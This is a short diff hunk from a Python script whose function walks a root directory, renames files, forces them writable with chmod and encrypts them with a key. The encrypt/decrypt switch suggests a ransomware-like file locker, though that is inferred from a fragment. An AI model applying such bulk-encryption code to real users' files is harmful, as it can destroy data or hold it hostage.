@@ -99,11 +99,10 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
             except IOError:
                 continue    
             os.rename(newFilename, filename)
-            try:
-                if not os.access(filename, os.W_OK):
-                    os.chmod(filename, stat.S_IWUSR)
-            except:
-                print("I dont even know")        
+            
+            os.chmod(filename, stat.S_IWRITE)
+            os.chmod(filename, stat.S_IWUSR)
+                
             if function == 0:    
                     try:
                         encrypt_file(key, filename, None, 64*1024)
